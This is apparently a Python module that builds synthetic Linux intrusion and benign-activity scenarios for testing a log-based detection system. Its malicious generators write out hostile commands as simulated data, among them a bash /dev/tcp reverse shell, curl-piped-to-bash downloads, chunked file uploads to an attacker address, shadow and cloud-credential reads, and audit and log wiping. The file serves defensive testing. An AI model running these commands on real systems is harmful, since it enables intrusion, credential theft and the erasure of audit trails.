from collections.abc import Callable
from dataclasses import dataclass

from linuxguard.evaluation.labels import Case
from linuxguard.evaluation.synthetic.background import MONITORING_SERVER, PACKAGE_MIRROR, read_file
from linuxguard.evaluation.synthetic.environment import (
    ACCOUNTS,
    COMMAND_PATHS,
    ROOT,
    WEB_SERVICE,
    Account,
    ShellSession,
    SimulationEnvironment,
)
from linuxguard.evaluation.synthetic.writers import OPEN_APPEND, OPEN_WRITE_TRUNCATE

ScenarioGenerator = Callable[[SimulationEnvironment, float], Case]


@dataclass(frozen=True, slots=True)
class ScenarioSpec:
    name: str
    malicious: bool
    covered_by_rules: bool | None
    description: str
    generate: ScenarioGenerator
    off_hours: bool = False


def _account(environment: SimulationEnvironment, role: str | None = None) -> Account:
    candidates = [account for account in ACCOUNTS if role is None or account.role == role]
    return environment.rng.choice(candidates)


def _compromised_session(environment: SimulationEnvironment, timestamp: float, role: str | None = None) -> ShellSession:
    account = _account(environment, role)
    return environment.ssh_login(timestamp, account, environment.attacker_ip(), method="password")


def _finish(
    environment: SimulationEnvironment,
    spec_name: str,
    start: float,
    end: float,
    shell: ShellSession | None,
    extra: dict[str, list[str]] | None = None,
) -> Case:
    spec = SCENARIOS_BY_NAME[spec_name]
    selectors: dict[str, list[str]] = {}
    if shell is not None:
        selectors["session_id"] = [str(shell.session)]
        if shell.source_ip:
            selectors["src_ip"] = [shell.source_ip]
    for key, values in (extra or {}).items():
        selectors.setdefault(key, []).extend(values)
    return environment.add_case(
        spec_name, spec.malicious, start, end, selectors, spec.covered_by_rules, spec.description
    )


def _commands(shell: ShellSession, timestamp: float, commands: list[list[str]], gap: tuple[float, float]) -> float:
    for arguments in commands:
        shell.run(timestamp, arguments)
        timestamp += shell.environment.rng.uniform(*gap)
    return timestamp


def brute_force(environment: SimulationEnvironment, start: float) -> Case:
    ip = environment.attacker_ip()
    timestamp = start
    for _ in range(environment.rng.randint(8, 20)):
        environment.ssh_failure(timestamp, environment.rng.choice(["root", "admin", "ubuntu"]), ip)
        timestamp += environment.rng.uniform(1.0, 4.0)
    return _finish(environment, "ssh_brute_force", start, timestamp, None, {"src_ip": [ip]})


def password_spray(environment: SimulationEnvironment, start: float) -> Case:
    ip = environment.attacker_ip()
    timestamp = start
    names = environment.rng.sample(
        ["admin", "test", "oracle", "postgres", "deploy", "git", "alice", "bob", "guest", "ftp"], 7
    )
    for name in names:
        environment.ssh_failure(timestamp, name, ip, invalid=name not in {"alice", "bob"})
        timestamp += environment.rng.uniform(15, 35)
    return _finish(environment, "password_spray", start, timestamp, None, {"src_ip": [ip]})


def brute_force_success(environment: SimulationEnvironment, start: float) -> Case:
    ip = environment.attacker_ip()
    account = _account(environment, "analyst")
    timestamp = start
    for _ in range(environment.rng.randint(4, 7)):
        environment.ssh_failure(timestamp, account.name, ip)
        timestamp += environment.rng.uniform(2.0, 6.0)
    shell = environment.ssh_login(timestamp, account, ip, method="password")
    timestamp = _commands(shell, timestamp + 3, [["whoami"], ["id"], ["uname", "-a"], ["cat", "/etc/passwd"]], (2, 6))
    return _finish(environment, "brute_force_success", start, timestamp, shell, {"src_ip": [ip]})


def shadow_access(environment: SimulationEnvironment, start: float) -> Case:
    shell = _compromised_session(environment, start, "administrator")
    timestamp = start + 5
    read_file(shell, ["cat", "/etc/shadow"], "/etc/shadow", timestamp, "lg_credentials", as_root=True)
    read_file(
        shell,
        ["cp", "/etc/shadow", "/var/tmp/.s"],
        "/etc/shadow",
        timestamp + 6,
        "lg_credentials",
        as_root=True,
    )
    return _finish(environment, "credential_file_access", start, timestamp + 8, shell)


def sudoers_tamper(environment: SimulationEnvironment, start: float) -> Case:
    shell = _compromised_session(environment, start, "administrator")
    timestamp = start + 4
    tee = shell.sudo(timestamp, ["tee", "-a", "/etc/sudoers"])
    environment.audit.file_open(
        timestamp + 0.1,
        tee,
        shell.shell.pid,
        "/etc/sudoers",
        OPEN_APPEND,
        "lg_identity",
        shell.cwd,
        ["tee", "-a", "/etc/sudoers"],
    )
    return _finish(environment, "sudoers_modification", start, timestamp + 1, shell)


def backdoor_account(environment: SimulationEnvironment, start: float) -> Case:
    shell = _compromised_session(environment, start, "administrator")
    timestamp = start + 5
    name = environment.rng.choice(["sysupdate", "backup2", "svc-mon"])
    useradd = shell.sudo(timestamp, ["useradd", "-m", "-s", "/bin/bash", name])
    environment.audit.account_change(timestamp + 0.2, useradd, "ADD_USER", "add-user", name)
    environment.auth.new_user(timestamp + 0.25, useradd.pid, name, 1050 + environment.rng.randint(0, 40))
    for path in ("/etc/passwd", "/etc/shadow"):
        environment.audit.rename(
            timestamp + 0.3, useradd, shell.shell.pid, f"{path}+", path, "lg_identity", ["useradd", name]
        )
    usermod = shell.sudo(timestamp + 8, ["usermod", "-aG", "sudo", name])
    environment.audit.account_change(
        timestamp + 8.2, usermod, "USER_MGMT", "add-user-to-group", name, "sudo", "/usr/sbin/usermod"
    )
    environment.auth.group_membership(timestamp + 8.25, usermod.pid, name, "sudo")
    environment.audit.rename(
        timestamp + 8.3, usermod, shell.shell.pid, "/etc/group+", "/etc/group", "lg_identity", ["usermod"]
    )
    return _finish(environment, "backdoor_account", start, timestamp + 10, shell)


def temporary_execution(environment: SimulationEnvironment, start: float) -> Case:
    shell = _compromised_session(environment, start)
    server = environment.attacker_ip()
    timestamp = start + 4
    wget = shell.run(timestamp, ["wget", "-q", f"http://{server}/u", "-O", "/tmp/.x/update"])
    environment.audit.connect(timestamp + 0.2, wget, shell.shell.pid, server, 80, ["wget"])
    chmod = shell.run(timestamp + 3, ["chmod", "+x", "/tmp/.x/update"])
    environment.audit.chmod(
        timestamp + 3.05, chmod, shell.shell.pid, "/tmp/.x/update", 0o755, ["chmod", "+x", "/tmp/.x/update"]
    )
    payload = shell.run(timestamp + 5, ["/tmp/.x/update"])
    environment.audit.connect(timestamp + 5.5, payload, shell.shell.pid, server, 443, ["/tmp/.x/update"])
    return _finish(environment, "temporary_directory_execution", start, timestamp + 6, shell)


def reverse_shell(environment: SimulationEnvironment, start: float) -> Case:
    shell = _compromised_session(environment, start)
    server = environment.attacker_ip()
    timestamp = start + 6
    command = f"bash -i >& /dev/tcp/{server}/4444 0>&1"
    bash = shell.run(timestamp, ["bash", "-c", command])
    environment.audit.connect(timestamp + 0.1, bash, shell.shell.pid, server, 4444, ["bash", "-c", command])
    inner = ShellSession(environment, shell.account, shell.session, shell.tty, bash, shell.cwd, shell.source_ip)
    timestamp = _commands(inner, timestamp + 5, [["id"], ["ls", "-la"]], (3, 8))
    return _finish(environment, "reverse_shell", start, timestamp, shell)


def download_execute(environment: SimulationEnvironment, start: float) -> Case:
    shell = _compromised_session(environment, start)
    server = environment.attacker_ip()
    timestamp = start + 5
    pipeline = f"curl -fsSL http://{server}/install.sh | bash"
    wrapper = shell.run(timestamp, ["sh", "-c", pipeline])
    curl = shell.run(timestamp + 0.05, ["curl", "-fsSL", f"http://{server}/install.sh"], parent=wrapper)
    environment.audit.connect(timestamp + 0.2, curl, wrapper.pid, server, 80, ["curl"])
    shell.run(timestamp + 0.06, ["bash"], parent=wrapper)
    return _finish(environment, "download_and_execute", start, timestamp + 2, shell)


def web_shell(environment: SimulationEnvironment, start: float) -> Case:
    php = environment.services["php-fpm"]
    command = "id; uname -a; cat /etc/passwd"
    shell_process = environment.service_process(WEB_SERVICE, COMMAND_PATHS["sh"])
    environment.audit.execution(start, shell_process, php.pid, ["sh", "-c", command], "/var/www/html/uploads")
    timestamp = start + 0.05
    for arguments in (["id"], ["uname", "-a"], ["cat", "/etc/passwd"]):
        child = environment.service_process(WEB_SERVICE, COMMAND_PATHS[arguments[0]])
        environment.audit.execution(timestamp, child, shell_process.pid, arguments, "/var/www/html/uploads")
        timestamp += 0.02
    return _finish(environment, "web_shell", start, timestamp + 1, None, {"user": [WEB_SERVICE.name]})


def cron_persistence(environment: SimulationEnvironment, start: float) -> Case:
    shell = _compromised_session(environment, start, "administrator")
    timestamp = start + 5
    path = "/etc/cron.d/sysupdate"
    tee = shell.sudo(timestamp, ["tee", path])
    environment.audit.file_open(
        timestamp + 0.1,
        tee,
        shell.shell.pid,
        path,
        OPEN_WRITE_TRUNCATE,
        "lg_persistence",
        shell.cwd,
        ["tee", path],
        created=True,
    )
    return _finish(environment, "cron_persistence", start, timestamp + 1, shell)


def ssh_key_persistence(environment: SimulationEnvironment, start: float) -> Case:
    shell = _compromised_session(environment, start)
    timestamp = start + 4
    path = f"{shell.account.home_directory}/.ssh/authorized_keys"
    environment.audit.file_open(
        timestamp, shell.shell, shell.shell.pid, path, OPEN_APPEND, "lg_ssh_keys", shell.cwd, ["-bash"]
    )
    return _finish(environment, "ssh_key_persistence", start, timestamp + 1, shell)


def kernel_module(environment: SimulationEnvironment, start: float) -> Case:
    shell = _compromised_session(environment, start, "administrator")
    timestamp = start + 5
    insmod = shell.sudo(timestamp, ["insmod", "/tmp/.k/netfilter_hlp.ko"])
    environment.audit.module_load(
        timestamp + 0.2, insmod, shell.shell.pid, "netfilter_hlp", ["insmod", "/tmp/.k/netfilter_hlp.ko"]
    )
    return _finish(environment, "kernel_module_load", start, timestamp + 1, shell)


def audit_tampering(environment: SimulationEnvironment, start: float) -> Case:
    shell = _compromised_session(environment, start, "administrator")
    timestamp = start + 5
    shell.sudo(timestamp, ["auditctl", "-D"])
    for index, key in enumerate(("lg_exec", "lg_identity", "lg_credentials", "lg_network", "lg_persistence")):
        environment.audit.configuration_change(
            timestamp + 0.2 + index * 0.01, shell.account.uid, shell.session, "remove_rule", key
        )
    return _finish(environment, "audit_tampering", start, timestamp + 1, shell)


def log_tampering(environment: SimulationEnvironment, start: float) -> Case:
    shell = _compromised_session(environment, start, "administrator")
    timestamp = start + 5
    bash = shell.sudo(timestamp, ["bash", "-c", "> /var/log/auth.log"])
    environment.audit.file_open(
        timestamp + 0.1,
        bash,
        shell.shell.pid,
        "/var/log/auth.log",
        OPEN_WRITE_TRUNCATE,
        "lg_logs",
        shell.cwd,
        ["bash", "-c", "> /var/log/auth.log"],
    )
    remove = shell.sudo(timestamp + 4, ["rm", "-f", "/var/log/wtmp"])
    environment.audit.unlink(
        timestamp + 4.1, remove, shell.shell.pid, "/var/log/wtmp", "lg_logs", ["rm", "-f", "/var/log/wtmp"]
    )
    return _finish(environment, "log_tampering", start, timestamp + 5, shell)


def setuid_backdoor(environment: SimulationEnvironment, start: float) -> Case:
    shell = _compromised_session(environment, start, "administrator")
    timestamp = start + 4
    shell.run(timestamp, ["cp", "/bin/bash", "/var/tmp/.sh"])
    chmod = shell.sudo(timestamp + 3, ["chmod", "u+s", "/var/tmp/.sh"])
    environment.audit.chmod(
        timestamp + 3.1, chmod, shell.shell.pid, "/var/tmp/.sh", 0o4755, ["chmod", "u+s", "/var/tmp/.sh"]
    )
    return _finish(environment, "setuid_backdoor", start, timestamp + 4, shell)


def discovery_burst(environment: SimulationEnvironment, start: float) -> Case:
    shell = _compromised_session(environment, start)
    commands = [
        ["whoami"],
        ["id"],
        ["uname", "-a"],
        ["hostname"],
        ["ip", "a"],
        ["ss", "-tunap"],
        ["ps", "aux"],
        ["last"],
        ["w"],
    ]
    timestamp = _commands(shell, start + 3, commands, (1.5, 4.0))
    return _finish(environment, "discovery_burst", start, timestamp, shell)


def data_exfiltration(environment: SimulationEnvironment, start: float) -> Case:
    shell = _compromised_session(environment, start, "analyst")
    server = environment.attacker_ip()
    timestamp = _commands(
        shell,
        start + 4,
        [
            ["find", shell.account.home_directory, "-name", "*.xlsx"],
            ["tar", "czf", "/var/tmp/.c.tgz", "analysis"],
            ["split", "-b", "5M", "/var/tmp/.c.tgz", "/var/tmp/.p"],
        ],
        (3, 6),
    )
    for index in range(environment.rng.randint(10, 18)):
        part = f"/var/tmp/.p{chr(97 + index // 26)}{chr(97 + index % 26)}"
        command = ["curl", "-s", "-T", part, f"https://{server}:8443/u"]
        curl = shell.run(timestamp, command)
        environment.audit.connect(timestamp + 0.1, curl, shell.shell.pid, server, 8443, command)
        timestamp += environment.rng.uniform(1.0, 3.0)
    return _finish(environment, "data_exfiltration", start, timestamp, shell)


def cryptominer(environment: SimulationEnvironment, start: float) -> Case:
    shell = _compromised_session(environment, start, "developer")
    pool = environment.attacker_ip()
    timestamp = _commands(shell, start + 4, [["nproc"], ["lscpu"]], (1, 3))
    miner_path = f"{shell.account.home_directory}/.cache/.kworkerd"
    miner = shell.run(timestamp, [miner_path, "-o", f"{pool}:3333", "--threads", "4"])
    for _ in range(environment.rng.randint(12, 20)):
        timestamp += environment.rng.uniform(5, 15)
        environment.audit.connect(timestamp, miner, shell.shell.pid, pool, 3333, [miner_path])
    return _finish(environment, "cryptominer", start, timestamp, shell)


def internal_scan(environment: SimulationEnvironment, start: float) -> Case:
    shell = _compromised_session(environment, start, "developer")
    timestamp = start + 4
    command = [
        "python3",
        "-c",
        "import socket;[socket.socket().connect_ex(('10.0.0.%d'%i,22)) for i in range(1,90)]",
    ]
    scanner = shell.run(timestamp, command)
    for host in environment.rng.sample(range(1, 90), 60):
        timestamp += environment.rng.uniform(0.05, 0.4)
        environment.audit.connect(timestamp, scanner, shell.shell.pid, f"10.0.0.{host}", 22, command, blocking=False)
    return _finish(environment, "internal_network_scan", start, timestamp, shell)


def mass_encryption(environment: SimulationEnvironment, start: float) -> Case:
    shell = _compromised_session(environment, start, "developer")
    timestamp = start + 4
    script = f"{shell.account.home_directory}/.local/share/enc.py"
    encryptor = shell.run(timestamp, ["python3", script])
    for index in range(environment.rng.randint(150, 300)):
        timestamp += environment.rng.uniform(0.05, 0.3)
        source = f"{shell.account.home_directory}/Documents/file_{index:04d}.docx"
        environment.audit.rename(
            timestamp,
            encryptor,
            shell.shell.pid,
            source,
            source + ".locked",
            "lg_home_change",
            ["python3", script],
        )
    return _finish(environment, "mass_file_encryption", start, timestamp, shell)


def off_hours_privilege(environment: SimulationEnvironment, start: float) -> Case:
    shell = _compromised_session(environment, start, "administrator")
    timestamp = start + 5
    for arguments in (
        ["find", "/", "-perm", "-4000", "-type", "f"],
        ["ls", "-la", "/root"],
        ["crontab", "-l"],
        ["tar", "czf", "/var/tmp/.w.tgz", "/var/www"],
        ["cat", "/root/.bash_history"],
    ):
        shell.sudo(timestamp, arguments)
        timestamp += environment.rng.uniform(4, 12)
    return _finish(environment, "off_hours_privileged_activity", start, timestamp, shell)


def dropped_implant(environment: SimulationEnvironment, start: float) -> Case:
    shell = _compromised_session(environment, start)
    server = environment.attacker_ip()
    timestamp = start + 4
    implant = f"{shell.account.home_directory}/.local/bin/gnome-helper"
    shell.run(timestamp, ["base64", "-d", "/var/tmp/.b64"])
    chmod = shell.run(timestamp + 2, ["chmod", "755", implant])
    environment.audit.chmod(timestamp + 2.05, chmod, shell.shell.pid, implant, 0o755, ["chmod", "755", implant])
    process = shell.run(timestamp + 4, [implant, "--daemon"])
    for _ in range(environment.rng.randint(6, 10)):
        timestamp += environment.rng.uniform(20, 40)
        environment.audit.connect(timestamp, process, shell.shell.pid, server, 443, [implant])
    return _finish(environment, "dropped_implant_beacon", start, timestamp, shell)


def credential_hunting(environment: SimulationEnvironment, start: float) -> Case:
    shell = _compromised_session(environment, start, "developer")
    commands = [
        ["find", "/", "-name", "id_rsa"],
        ["grep", "-rn", "password", "/var/www", "/home"],
        ["cat", f"{shell.account.home_directory}/.bash_history"],
        ["find", "/home", "-name", "*.kdbx"],
        ["cat", "/var/www/html/wp-config.php"],
        ["ls", "-la", f"{shell.account.home_directory}/.aws"],
        ["cat", f"{shell.account.home_directory}/.aws/credentials"],
        ["grep", "-r", "BEGIN OPENSSH PRIVATE KEY", "/home"],
    ]
    timestamp = _commands(shell, start + 3, commands, (2, 6))
    return _finish(environment, "credential_hunting", start, timestamp, shell)


def system_update(environment: SimulationEnvironment, start: float) -> Case:
    account = _account(environment, "administrator")
    shell = environment.ssh_login(start, account, account.workstation)
    timestamp = start + 4
    apt = shell.sudo(timestamp, ["apt", "upgrade", "-y"])
    for index in range(environment.rng.randint(4, 8)):
        method = shell.run(timestamp + 1 + index * 0.5, ["/usr/lib/apt/methods/http"], parent=apt, as_root=True)
        environment.audit.connect(
            timestamp + 1.1 + index * 0.5, method, apt.pid, PACKAGE_MIRROR, 80, ["/usr/lib/apt/methods/http"]
        )
    timestamp += 6
    for index in range(environment.rng.randint(10, 25)):
        dpkg = shell.run(
            timestamp,
            ["dpkg", "--unpack", f"/var/cache/apt/archives/pkg{index}.deb"],
            parent=apt,
            as_root=True,
        )
        if index % 3 == 0:
            shell.run(
                timestamp + 0.3,
                [f"/var/lib/dpkg/info/pkg{index}.postinst", "configure"],
                parent=dpkg,
                as_root=True,
            )
        timestamp += environment.rng.uniform(0.5, 2.0)
    shell.run(timestamp, ["systemctl", "daemon-reload"], parent=apt, as_root=True)
    return _finish(environment, "system_update", start, timestamp + 1, shell)


def backup_job(environment: SimulationEnvironment, start: float) -> Case:
    job = environment.system_session(ROOT)
    cron = environment.services["cron"]
    shell = job.run(start, ["sh", "-c", "/usr/local/bin/backup.sh"], parent=cron)
    timestamp = start + 0.1
    job.run(timestamp, ["tar", "czf", "/var/backups/home.tgz", "/home"], parent=shell)
    timestamp += environment.rng.uniform(30, 90)
    rsync = job.run(
        timestamp, ["rsync", "-a", "/var/backups/", f"backup@{MONITORING_SERVER}:/srv/backups/"], parent=shell
    )
    ssh = job.run(timestamp + 0.1, ["ssh", "-l", "backup", MONITORING_SERVER, "rsync", "--server"], parent=rsync)
    environment.audit.connect(timestamp + 0.2, ssh, rsync.pid, MONITORING_SERVER, 22, ["ssh"])
    return _finish(environment, "backup_job", start, timestamp + 5, job)


def developer_build(environment: SimulationEnvironment, start: float) -> Case:
    account = _account(environment, "developer")
    shell = environment.ssh_login(start, account, account.workstation)
    shell.cwd = f"{account.home_directory}/projects/engine"
    timestamp = start + 5
    make = shell.run(timestamp, ["make", "-j4"])
    for index in range(environment.rng.randint(40, 80)):
        unit = f"src/module_{index}.c"
        gcc = shell.run(timestamp + 0.1, ["gcc", "-O2", "-c", unit], parent=make)
        shell.run(timestamp + 0.15, ["/usr/libexec/gcc/x86_64-linux-gnu/13/cc1", unit], parent=gcc)
        shell.run(timestamp + 0.4, ["/usr/bin/x86_64-linux-gnu-as", "-o", f"module_{index}.o"], parent=gcc)
        timestamp += environment.rng.uniform(0.2, 0.8)
    shell.run(timestamp, ["/usr/bin/x86_64-linux-gnu-ld", "-o", "engine"], parent=make)
    return _finish(environment, "developer_build", start, timestamp + 1, shell)


def administrator_creates_account(environment: SimulationEnvironment, start: float) -> Case:
    account = _account(environment, "administrator")
    shell = environment.ssh_login(start, account, account.workstation)
    timestamp = start + 6
    name = environment.rng.choice(["newhire", "intern1", "contractor"])
    adduser = shell.sudo(timestamp, ["adduser", "--disabled-password", name])
    useradd = shell.run(timestamp + 0.2, ["useradd", "-m", name], parent=adduser, as_root=True)
    environment.audit.account_change(timestamp + 0.3, useradd, "ADD_USER", "add-user", name)
    environment.auth.new_user(timestamp + 0.35, useradd.pid, name, 1100 + environment.rng.randint(0, 50))
    shell.run(timestamp + 2, ["passwd", "-e", name], parent=adduser, as_root=True)
    return _finish(environment, "administrator_account_creation", start, timestamp + 3, shell)


def password_typo(environment: SimulationEnvironment, start: float) -> Case:
    account = _account(environment)
    timestamp = start
    for _ in range(environment.rng.randint(1, 3)):
        environment.ssh_failure(timestamp, account.name, account.workstation)
        timestamp += environment.rng.uniform(3, 8)
    shell = environment.ssh_login(timestamp, account, account.workstation, method="password")
    timestamp = _commands(shell, timestamp + 3, [["ls"], ["git", "status"]], (3, 10))
    return _finish(environment, "password_typo", start, timestamp, shell, {"src_ip": [account.workstation]})


def administrator_troubleshooting(environment: SimulationEnvironment, start: float) -> Case:
    account = _account(environment, "administrator")
    shell = environment.ssh_login(start, account, account.workstation)
    commands = [
        ["uptime"],
        ["ps", "aux"],
        ["ss", "-tlnp"],
        ["ip", "a"],
        ["who"],
        ["w"],
        ["last"],
        ["df", "-h"],
        ["id"],
    ]
    timestamp = _commands(shell, start + 4, commands, (2, 5))
    return _finish(environment, "administrator_troubleshooting", start, timestamp, shell)


SCENARIOS: tuple[ScenarioSpec, ...] = (
    ScenarioSpec("ssh_brute_force", True, True, "Password guessing against SSH from one address", brute_force),
    ScenarioSpec("password_spray", True, True, "One password tried against many accounts", password_spray),
    ScenarioSpec(
        "brute_force_success",
        True,
        True,
        "Password guessing followed by a successful login",
        brute_force_success,
    ),
    ScenarioSpec("credential_file_access", True, True, "Reading the shadow password database", shadow_access),
    ScenarioSpec("sudoers_modification", True, True, "Granting sudo rights by editing /etc/sudoers", sudoers_tamper),
    ScenarioSpec("backdoor_account", True, True, "Creating a new account and adding it to sudo", backdoor_account),
    ScenarioSpec(
        "temporary_directory_execution",
        True,
        True,
        "Running a downloaded payload from /tmp",
        temporary_execution,
    ),
    ScenarioSpec("reverse_shell", True, True, "Interactive bash reverse shell over /dev/tcp", reverse_shell),
    ScenarioSpec("download_and_execute", True, True, "Piping a downloaded script into bash", download_execute),
    ScenarioSpec("web_shell", True, True, "Shell commands spawned by PHP-FPM", web_shell),
    ScenarioSpec("cron_persistence", True, True, "Persistence through /etc/cron.d", cron_persistence),
    ScenarioSpec(
        "ssh_key_persistence", True, True, "Appending an attacker key to authorized_keys", ssh_key_persistence
    ),
    ScenarioSpec("kernel_module_load", True, True, "Loading an untrusted kernel module", kernel_module),
    ScenarioSpec("audit_tampering", True, True, "Deleting all audit rules", audit_tampering),
    ScenarioSpec("log_tampering", True, True, "Truncating auth.log and deleting wtmp", log_tampering),
    ScenarioSpec("setuid_backdoor", True, True, "Creating a setuid copy of bash", setuid_backdoor),
    ScenarioSpec("discovery_burst", True, True, "Rapid host and network discovery", discovery_burst),
    ScenarioSpec("data_exfiltration", True, False, "Archiving data and uploading it in chunks", data_exfiltration),
    ScenarioSpec("cryptominer", True, False, "Hidden miner connecting to a mining pool", cryptominer),
    ScenarioSpec("internal_network_scan", True, False, "Scanning the internal network for SSH", internal_scan),
    ScenarioSpec("mass_file_encryption", True, False, "Ransomware-like mass renaming of documents", mass_encryption),
    ScenarioSpec(
        "off_hours_privileged_activity",
        True,
        False,
        "Privileged collection at night",
        off_hours_privilege,
        off_hours=True,
    ),
    ScenarioSpec(
        "dropped_implant_beacon", True, False, "Decoded implant beaconing to a remote server", dropped_implant
    ),
    ScenarioSpec("credential_hunting", True, False, "Searching files for keys and passwords", credential_hunting),
    ScenarioSpec("system_update", False, None, "Administrator upgrading packages", system_update),
    ScenarioSpec("backup_job", False, None, "Nightly backup archived and copied off-host", backup_job, off_hours=True),
    ScenarioSpec("developer_build", False, None, "Large parallel compilation", developer_build),
    ScenarioSpec(
        "administrator_account_creation",
        False,
        None,
        "Approved creation of a new account",
        administrator_creates_account,
    ),
    ScenarioSpec("password_typo", False, None, "Mistyped passwords followed by a successful login", password_typo),
    ScenarioSpec(
        "administrator_troubleshooting",
        False,
        None,
        "Administrator inspecting the system",
        administrator_troubleshooting,
    ),
)
SCENARIOS_BY_NAME = {spec.name: spec for spec in SCENARIOS}
MALICIOUS_SCENARIOS = tuple(spec for spec in SCENARIOS if spec.malicious)
BENIGN_SCENARIOS = tuple(spec for spec in SCENARIOS if not spec.malicious)
